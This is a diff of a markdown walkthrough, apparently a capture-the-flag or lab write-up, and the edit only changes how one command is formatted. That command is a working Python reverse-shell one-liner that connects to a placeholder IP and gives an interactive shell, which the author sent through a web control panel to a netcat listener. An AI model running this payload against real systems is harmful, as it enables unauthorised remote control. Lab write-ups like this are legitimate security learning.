@@ -126,7 +126,7 @@ Alternatively, we would have been able to 'less' the .txt files and gotten their
 
 At this point, we can continue to issue commands to the web browser panel.  However, for practice and ease of use, I chose to implement a reverse shell.  I started netcat on my machine, and listened on port 4444 (an arbitrary port).  I then issued the command
 
-> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\[YOUR IP]",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'
+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\[YOUR IP]",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'`
 
 on the control panel, and was able to spawn the reverse shell:
 
